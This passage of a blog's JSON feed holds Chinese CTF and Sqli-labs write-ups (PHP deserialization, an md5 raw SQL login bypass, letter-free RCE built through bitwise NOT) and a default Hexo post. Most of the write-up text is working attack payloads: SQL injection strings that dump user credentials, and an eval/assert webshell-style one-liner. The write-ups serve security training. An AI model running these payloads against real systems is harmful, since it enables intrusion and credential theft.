class=\"line\">&lt;?php  </span><br><span class=\"line\"></span><br><span class=\"line\">class Flag&#123;  //flag.php  </span><br><span class=\"line\">    public $file;  </span><br><span class=\"line\">    public function __tostring()&#123;  </span><br><span class=\"line\">        if(isset($this-&gt;file))&#123;  </span><br><span class=\"line\">            echo file_get_contents($this-&gt;file); </span><br><span class=\"line\">            echo &quot;&lt;br&gt;&quot;;</span><br><span class=\"line\">        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">?&gt;  </span><br></pre></td></tr></table></figure>\n<p>注意 tostring 魔术方法在对象被当作字符串处理时会调用，index 里就是 echo</p>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class Flag&#123;    </span><br><span class=\"line\">    public $file=&#x27;flag.php&#x27;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$p=new Flag();</span><br><span class=\"line\">echo urlencode(serialize($p));</span><br><span class=\"line\">?&gt;  </span><br><span class=\"line\"></span><br><span class=\"line\">O%3A4%3A%22Flag%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D</span><br></pre></td></tr></table></figure>\n<p>`<br>\n 最终 payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?text=file=php://input&amp;&amp;file=useless.php&amp;&amp;password=</span><br><span class=\"line\">O%3A4%3A%22Flag%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D</span><br><span class=\"line\"></span><br><span class=\"line\">post传参:welcome to the zjct</span><br></pre></td></tr></table></figure>\n<p>检查可发现源代码注释部分有 flag</p>\n<h3 id=\"7easy_md5\"><a class=\"markdownIt-Anchor\" href=\"#7easy_md5\">#</a> 7.easy_md5</h3>\n<p>F12-&gt; 网络 -&gt; 请求头 -&gt;hint</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$sql</span> = <span class=\"string\">&quot;SELECT * FROM admin WHERE username = &#x27;admin&#x27; and password = &#x27;&quot;</span>.<span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$password</span>,<span class=\"literal\">true</span>).<span class=\"string\">&quot;&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">content: ffifdyop</span><br><span class=\"line\">hex: 276f722736c95d99e921722cf9ed621c</span><br><span class=\"line\">raw: &#x27;or&#x27;6\\xc9]\\x99\\xe9!r,\\xf9\\xedb\\x1c</span><br><span class=\"line\">string: &#x27;or&#x27;6]!r,b</span><br></pre></td></tr></table></figure>\n<p>注意:<br>\n <code>\\和后面三个字符算一个字符</code> <br>\n sql:``select * from admin where username=‘admin’ and password=’&quot;‘or’6]!r,b&quot;’;</p>\n<p>在 mysql 里面，在用作布尔型判断时，以 1 开头的字符串会被当做整型数。要注意的是这种情况是必须要有单引号括起来的，比如 password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于 password=‘xxx’ or 1  ，也就相当于 password=‘xxx’ or true，所以返回值就是 true</p>\n<p>关键是:<mark>’ or 1’</mark><br>\n答案肯定不止一个</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">content: 129581926211651571912466741651878684928</span><br><span class=\"line\">hex: 06da5430449f8f6f23dfc1276f722738</span><br><span class=\"line\">raw: \\x06\\xdaT0D\\x9f\\x8fo#\\xdf\\xc1&#x27;or&#x27;8</span><br><span class=\"line\">string: T0Do#&#x27;or&#x27;8</span><br></pre></td></tr></table></figure>\n<p>复现:<br>\n![[Pasted image 20230425192651.png]]</p>\n<p>然后就是常规的数组绕过，0e 绕过了</p>\n<h3 id=\"8swpuctf-2021-新生赛hardrce\"><a class=\"markdownIt-Anchor\" href=\"#8swpuctf-2021-新生赛hardrce\">#</a> 8.[SWPUCTF 2021 新生赛] hardrce</h3>\n<h4 id=\"无字母rce\"><a class=\"markdownIt-Anchor\" href=\"#无字母rce\">#</a> 无字母 rce</h4>\n<ol>\n<li>system () 函数</li>\n</ol>\n<ul>\n<li>执行外部程序并显示输出资料</li>\n</ul>\n<ol start=\"2\">\n<li>eval () 函数</li>\n</ol>\n<ul>\n<li>把字符串当 php 代码执行，必须以；结尾</li>\n</ul>\n<ol start=\"3\">\n<li>php 的取反问题～<br>\n 此题过滤了很多黑名单，根据题目提示是无字母 rce 想到了～</li>\n</ol>\n<ul>\n<li>对于数字取反的规则可以看看这篇:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1dpbGxpYW1zV2F5bmUvYXJ0aWNsZS9kZXRhaWxzLzc4MjU5NTAx\">https://blog.csdn.net/WilliamsWayne/article/details/78259501</span></li>\n<li>对于字符取反，由于有大量的不可显字符，要 url 编码</li>\n<li>方法一:</li>\n<li>eg1.</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">echo urlencode(~&quot;phpinfo&quot;);</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">%8F%97%8F%96%91%99%90</span><br></pre></td></tr></table></figure>\n<p>payload:(~%8F%97%8F%96%91%99%90<br>\n)();</p>\n<p>配合 eval 函数可以直接把 phpinfo (); 当 php 代码执行<br>\n eg2.<br>\n 要构造 <code>assert($_POST[1])</code>  语句，</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$a=urlencode(~&quot;assert&quot;);</span><br><span class=\"line\">$b=urlencode(~&quot;_POST&quot;);</span><br><span class=\"line\">echo $a;</span><br><span class=\"line\">echo &quot;\\n&quot;;</span><br><span class=\"line\">echo $b;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">得到</span><br><span class=\"line\">%9E%8C%8C%9A%8D%8B</span><br><span class=\"line\">%A0%AF%B0%AC%AB</span><br><span class=\"line\"></span><br><span class=\"line\">$_=~(%9E%8C%8C%9A%8D%8B); //$_=assert</span><br><span class=\"line\">$__=~(%A0%AF%B0%AC%AB);   //$__=_POST</span><br><span class=\"line\">$___=$$__;         //$___=$_POST</span><br><span class=\"line\">$_($___[1]);      //assert($_POST[1]);</span><br><span class=\"line\"></span><br><span class=\"line\">payload(写在一行):</span><br><span class=\"line\">$_=~(%9E%8C%8C%9A%8D%8B);$__=~(%A0%AF%B0%AC%AB);$___=$$__;$_($___[1]);</span><br><span class=\"line\"></span><br><span class=\"line\">post:</span><br><span class=\"line\">1=phpinfo();</span><br></pre></td></tr></table></figure>\n<p>常见取反 url:</p>\n<ol>\n<li>system:%8C%86%8C%8B%9A%92</li>\n<li>ls /:%93%8C%DF%D0<br>\n <code>system(ls);==(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);</code></li>\n<li>cat:%9C%9E%8B</li>\n<li>cat /flag:%9C%9E%8B%DF%D0%99%93%9E%98</li>\n<li>cat /flllllaaaaaaggggggg:%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98<br>\n 可自行运行得:</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">echo urlencode(~&quot;xxx&quot;);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>方法二:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">print(&quot;卢&quot;.encode(&quot;utf8&quot;))</span><br><span class=\"line\">b&#x27;\\xe5\\x8d\\xa2&#x27;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$_=&quot;卢&quot;;</span><br><span class=\"line\">print(~($_&#123;1&#125;));</span><br><span class=\"line\">print(~&quot;\\x8d&quot;);</span><br><span class=\"line\">// 输出rr</span><br></pre></td></tr></table></figure>\n<p><code>$_&#123;1&#125;是\\x8d,\\x8d取反是r</code></p>\n<p>此题 payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?wllm=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98);</span><br><span class=\"line\"></span><br><span class=\"line\">system(&quot;cat /flllllaaaaaaggggggg&quot;);</span><br></pre></td></tr></table></figure>\n<p><strong>深刻学习无字母 rce 来这里</strong><a href=\"https://hq185187.github.io/2023/04/26/%E6%97%A0%E5%AD%97%E6%AF%8Drce/\">来学无参构造 rce</a></p>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/04/24/sqli-labs/",
            "url": "https://hq185187.github.io/2023/04/24/sqli-labs/",
            "title": "Sqli-labs靶场通关",
            "date_published": "2023-04-23T16:32:55.178Z",
            "content_html": "<h3 id=\"怎么判断字符型或者数字型\"><a class=\"markdownIt-Anchor\" href=\"#怎么判断字符型或者数字型\">#</a> 怎么判断字符型或者数字型？</h3>\n<p>数字型:id=2 和 id=3-1 返回界面相同<br>\n原理：说明 2-1 被解析了，旁边没有引号<br>\n字符型:id=2 和 id=2a 页面一样就行<br>\n原理：MySQL 等号两边类型不一致会发生强制转换，字符串 -&gt; 数字</p>\n<p>group_concat 是用，连接多行记录的函数</p>\n<p>less1<br>\n 字符型注入<br>\n看源码:sql=“SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;</p>\n<p>因此:<mark>payload:1’   操作   --+</mark></p>\n<p>?id=1’ order by 3–+<br>\n?id=1’ order by 4–+<br>\n?id=-1’ union select 1,2,3–+// 判断回显位<br>\n？id=-1’ union select 1,2,database ()–+<br>\n?id=-1’ union select1,2,group_concat(table_name) from information_schema.tables where table_schema=database()–+</p>\n<p>?id=-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=‘users’ and table_schema=database()–+</p>\n<p>?id=-1’ union select 1,group_concat(username),group_concat(password) from users–+</p>\n<p>less2<br>\n 数字型<br>\n看源码:sql=“SELECT * FROM users WHERE id=$id LIMIT 0,1”;<br>\n 直接输入数字就好，解法与 less1 相同，去掉 less1 的’和–+ 即可</p>\n<p>布尔盲注:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1 and (select mid((group_concat(username,0x7e,password) from users),1,1))=&#x27;D&#x27;</span><br></pre></td></tr></table></figure>\n<p>less3<br>\nid=1’)–+</p>\n<p>less4<br>\nid=1&quot;)–+</p>\n<p>less5<br>\n 报错注入:updatexml 函数<br>\n updatexml (xml_doument,XPath_string,new_value)<br>\n 第一个参数：XML 的内容<br>\n第二个参数：是需要 update 的位置 XPATH 路径<br>\n第三个参数：是更新后的内容<br>\n所以第一和第三个参数可以随便写，只需要利用第二个参数，他会校验你输入的内容是否符合 XPATH 格式，不对就爆出正确内容<br>\n可以校验的：0x7e (~),0x5e24 (^$),’#’(#)<br>\npayload:<br>\n?id=1’ and updatexml (1,concat (0x7e,database ()),1)–+ 暴当前数据库</p>\n<p>?id=1’ and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database())),1)–+<br>\n 此时会出现 Subquery returns more than 1 row<br>\n1. 可以用 limit 解决，limit 0,1 1,1 2,1 3,1<br>\n 在 limit 3,1 找到 users 表<br>\n？id=1’ and updatexml (1,concat (0x7e,(select table_name from information_schema.tables where table_schema=database () limit 3,1)),1)–+<br>\n 后面同理爆字段<br>\n 2. 加个 group_concat 解决<br>\n？id=1’ and updatexml (1,concat (0x7e,(select group_concat (table_name) from information_schema.tables where table_schema=database ())),1)–+<br>\n 过程同上<br>\n最后<br>\n？id=1’ and updatexml (1,concat (0x7e,(select group_concat (username) from users)),1)–+</p>\n<p>substr 方法<br>\n’ or updatexml (1,concat (0x7e,substr ((select group_concat (schema_name) from information_schema.schemata),1,31),0x7e),1)–+<br>\n 后面把 1,31 换成 32,31<br>\n63,31<br>\n94,31</p>\n<p>less6<br>\nid=1&quot; 与 less5 一样</p>\n<p>less7<br>\n 布尔盲注<br>\n根据页面回显试探数据，可以二分法，函数:substring (),mid (),substr ().<br>\neg.?id=1’ and (select mid((select concat(user,0x7e,password) from users),1,1))=’’–+<br>\n 一直到 less10, 布尔和时间盲注直接用 sqlimap</p>\n<p>less11<br>\n 输入？id=1 发现 url 地址没有显示，抓包发现 post 方式<br>\n uname=11&amp;passwd=1&amp;submit=Submit<br>\n 判断字符型<br>\n接下来用基本的 union 注入就欧克<br>\n less12<br>\n&quot;) 型，联合注入<br>\n less13<br>\n)’ # 加上报错注入<br>\n less14<br>\n“# 加上报错注入<br>\n less15<br>\n 不显示报错信息只能盲注<br>\n单引号字符型的布尔盲注:<br>\n1’ --+<br>\n<span class=\"exturl\" data-url=\"aHR0cDovL3huLS1sZXNzMTUtMmc0bTA3M2dtcXcucHk=\"> 用脚本 less15.py</span><br>\n 用法:<br>\nfrom less15 import *<br>\nDatabase15()<br>\nTables15()<br>\n Columns15 (‘库’,‘表’)<br>\n Content15 (‘库’,‘表’,‘字段’,‘字段’)<br>\nless16<br>\n 双引号字符型加括号的盲注<br>\n 1”) --+<br>\n 脚本:less16.py</p>\n<p>less17<br>\n1. 注入点在 password 栏里，单引号字符加报错注入<br>\n 2. 先抓包，copy to file, 用 sqlmap 工具<br>\n python3 <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -r 路径</p>\n<p>less18<br>\n 注入点在 user-agent, 且用户名密码必须正确<br>\n注意：闭合之前的部分必须为空，很恶心<br>\n’ or updatexml (1,concat (0x7e,(select group_concat (table_name) from information_schema.tables where table_schema=database ())),1) or’</p>\n<p>最后:<br>\n’ or updatexml(1,concat(0x7e,(select group_concat(concat(username))from security.users)),1) or’</p>\n<p>less19<br>\n 与 18 一样，注入点在 referer</p>\n<p>less20<br>\n 输入正确的用户名和密码，抓到两个包，get 包里有 cookie, 注入点在 cookie</p>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/04/23/hello-world/",
            "url": "https://hq185187.github.io/2023/04/23/hello-world/",
            "title": "Hello World",
            "date_published": "2023-04-23T15:55:29.640Z",
            "content_html": "<p>Welcome to <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvLw==\">Hexo</span>! This is your very first post. Check <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mv\">documentation</span> for more info. If you get any problems when using Hexo, you can find the answer in <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3MvdHJvdWJsZXNob290aW5nLmh0bWw=\">troubleshooting</span> or you can ask me on <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2hleG9qcy9oZXhvL2lzc3Vlcw==\">GitHub</span>.</p>\n<h2 id=\"quick-start\"><a class=\"markdownIt-Anchor\" href=\"#quick-start\">#</a> Quick Start</h2>\n<h3 id=\"create-a-new-post\"><a class=\"markdownIt-Anchor\" href=\"#create-a-new-post\">#</a> Create a new post</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvd3JpdGluZy5odG1s\">Writing</span></p>\n<h3 id=\"run-server\"><a class=\"markdownIt-Anchor\" href=\"#run-server\">#</a> Run server</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvc2VydmVyLmh0bWw=\">Server</span></p>\n<h3 id=\"generate-static-files\"><a class=\"markdownIt-Anchor\" href=\"#generate-static-files\">#</a> Generate static files</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3MvZ2VuZXJhdGluZy5odG1s\">Generating</span></p>\n<h3 id=\"deploy-to-remote-sites\"><a class=\"markdownIt-Anchor\" href=\"#deploy-to-remote-sites\">#</a> Deploy to remote sites</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvb25lLWNvbW1hbmQtZGVwbG95bWVudC5odG1s\">Deployment</span></p>\n",
            "tags": []
        }
    ]
}